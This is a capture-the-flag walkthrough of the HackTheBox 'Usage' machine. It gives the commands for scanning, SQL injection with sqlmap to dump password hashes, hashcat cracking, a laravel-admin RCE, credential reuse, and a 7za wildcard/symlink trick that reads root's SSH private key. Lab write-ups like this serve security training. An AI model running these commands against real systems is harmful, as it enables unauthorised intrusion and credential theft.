> **IP Address: 10.129.100.5**

```bash
sudo nmap -T5 -p- 10.129.100.5
```

![[usage_initial_nmap.png]]

```bash
sudo nmap -sV -sC -v -p 22,80 -oA usage.tcp 10.129.100.5 
```

![[usage_depth_scan.png]]

### Port 22
ssh - openssh 8.9p1 Ubuntu 3ubuntu0.6

```bash
searchsploit openssh
```

*No results for this version*
### Port 80
http - nginx 1.18.0
	jQuery 2.1.4
	Bootstrap 3.3.5
	iCheck v1.0.1
	AdminLTE v2.3.2

```bash
searchsploit nginx
```

*Only a DOS for this version*

> Attempting to go to the IP Address in the browser returned an unknown host "usage" error

![[usage_unknown_host.png]]

```bash
sudo vim /etc/hosts
```

*Add the following line to the bottom of the file*
>10.129.100.5 usage.htb

Navigating to the page now returns a login page

![[usage_login_page.png]]

> Clicking on the "Register" button takes you to a registration page

![[usage_registration.png]]

After registering a user and logging in, you are directed to a "Featured Blogs" page

![[usage_featured_blogs.png]]
> Last blog post hints at PHP usage

> Clicking on the "Admin" button in the top right navigates to a new subdomain of "admin.usage.htb"

![[usage_admin_unknown.png]]

```bash
sudo vim /etc/hosts
```

*Add the following line to the end of the previously added line*
> admin.usage.htb

navigating to the page now returns an admin login

![[usage_admin_login.png]]

> Trying any default creds did not work and there were no signs of SQL injection on the admin page

>After going back to the first page, I was able to find a possible SQL injection in the "forget-password" page by putting in single-quote

![[usage_forget_password.png]]
![[usage_forget_password2.png]]![[usage_forget_password3.png]]![[usage_forget_password4.png]]

>Grabbing this POST request from BurpSuite and passing it to SQLmap should return some interesting results

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 
```

![[usage_sqlmap_confirmed.png]]

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 --tables
```

![[usage_sqlmap_all_dbs.png]]

![[usage_sqlmap_tables.png]]

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 -D usage_blog -T admin_users --dump
```

![[usage_admin_password.png]]

```bash
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' admin_hash
```

```bash
sudo hashcat -m 3200 -a 0 admin_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

![[usage_cracked_admin_password.png]]

> admin:whatever1

![[usage_admin_page.png]]

encore/laravel-admin - 1.8.18

> There is an RCE for this version https://flyd.uk/post/cve-2023-24249/

![[usage_admin_settings.png]]![[usage_admin_settings_POST_request.png]]
![[usage_admin_settings_exploit.png]]
![[usage_reverse_shell_caught.png]]

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![[usage_user_confirmation.png]]

```bash
uname -a
```

![[usage_uname.png]]

```bash
./linpeas.sh
```

Found that root can log in with an SSH key but not a password, there should be an SSH key for root somewhere. Default location would be /root/.ssh/id_rsa

![[usage_root_ssh_permitted.png]]

Found SQL credentials in the linpeas output

> staff:s3cr3t_c0d3d_1uth

I reran SQLMap against the users table in case there was any password reuse there

```bash
sqlmap -r forget-password-request -p email --level=5 --risk=3 -D usage_blog -T users --dump
```

![[usage_sqlmap_blog_users.png]]

```bash
echo '$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4.' > userHashes
```

```bash
echo '$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa' >> userHashes
```

```bash
sudo hashcat -m 3200 -a 0 user_Hashes /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

![[usage_blog_users_cracked_passwords.png]]

I tried the password for xander and that did not work
I was able to log in as raj, but there was nothing on the page other than the homepage

```bash
netstat -antop
```

![[usage_open_services.png]]

There is a process called monit that I see is running on port 2812 and I remember seeing files in dash's home directory with that name

reading the file ".monitrc" in dash's home directory has an admin password in it for something

> admin:3nc0d3d_pa\$$w0rd

I tried this password for the user Xander and was able to log in as Xander

>xander:3nc0d3d_pa\$$w0rd

```bash
sudo -l
```

![[usage_sudo_l_xander.png]]

As xander I can run the command 'usage_management' as root

Looking at what the usage_management command is doing using pspy, there are 3 options to the commands but only one really does anything it seems

![[usage_usage_management.png]]

![[usage_usage_management1.png]]
![[usage_pspy1.png]]


![[usage_usage_management2.png]]
![[usage_pspy2.png]]

![[usage_usage_management3.png]]
![[usage_pspy3.png]]

Looking into mysqldump I didn't see anything that I could do, but for the 7za command I found an option on Hacktricks that might work

![[usage_hacktricks_7z.png]]

Since we know that there should be a root ssh key somewhere, I may be able to use this to read that key

Looking at the output of the usage_management command the directory that I will need to create the file in
> /var/www/html

```bash
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

![[usage_7z_location.png]]

```bash
sudo usage_management (option 1)
```

![[usage_sudo_usagemanagement_exploit.png]]![[usage_sudo_usagemanagement_exploit2.png]]

![[usage_root_ssh_key.png]]

```bash
ssh -i root_ssh_key root@10.129.100.5
```

![[usage_root_confirmation.png]]